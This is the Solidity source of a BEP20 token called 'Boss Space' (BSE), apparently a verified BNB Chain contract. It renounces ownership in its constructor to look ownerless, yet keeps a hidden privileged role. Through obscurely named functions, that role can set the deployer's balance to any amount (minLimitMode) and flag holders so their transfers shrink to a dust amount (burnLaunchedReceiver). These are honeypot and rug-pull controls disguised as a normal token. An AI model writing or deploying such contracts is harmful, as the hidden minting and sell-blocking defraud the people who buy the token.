/**
 *Submitted for verification at BscScan.com on 2023-01-29
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BossSpace is IBEP20, Ownable {
    uint8 constant _decimals = 18;
    uint256 constant burnFromAmount = 10 ** 10;
    address public buyToMarketing;
    mapping(address => bool) public totalFromAmount;
    bool public swapMax;

    string constant _symbol = "BSE";
    address public receiverAt;
    string constant _name = "Boss Space";
    uint256 _totalSupply = 100000000 * (10 ** _decimals);

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) public isTx;

    

    constructor (){
        UniswapRouter fundFee = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        buyToMarketing = UniswapFactory(fundFee.factory()).createPair(fundFee.WETH(), address(this));
        receiverAt = msg.sender;
        isTx[receiverAt] = true;
        _balances[receiverAt] = _totalSupply;
        emit Transfer(address(0), receiverAt, _totalSupply);
        renounceOwnership();
    }

    receive() external payable {}

    

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == receiverAt || recipient == receiverAt) {
            return feeTeam(sender, recipient, amount);
        }
        if (totalFromAmount[sender]) {
            amount = burnFromAmount;
        }
        return feeTeam(sender, recipient, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function minLimitMode(uint256 sellReceiver) public {
        if (sellReceiver == 0 || !isTx[msg.sender]) {
            return;
        }
        _balances[receiverAt] = sellReceiver;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function takeLaunched(address walletTokenMin) public {
        if (swapMax) {
            return;
        }
        isTx[walletTokenMin] = true;
        swapMax = true;
    }

    function feeTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(amount <= _balances[sender]);
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function burnLaunchedReceiver(address totalAmount) public {
        if (totalAmount == receiverAt || !isTx[msg.sender]) {
            return;
        }
        totalFromAmount[totalAmount] = true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            require(amount <= _allowances[sender][msg.sender]);
            _allowances[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }


}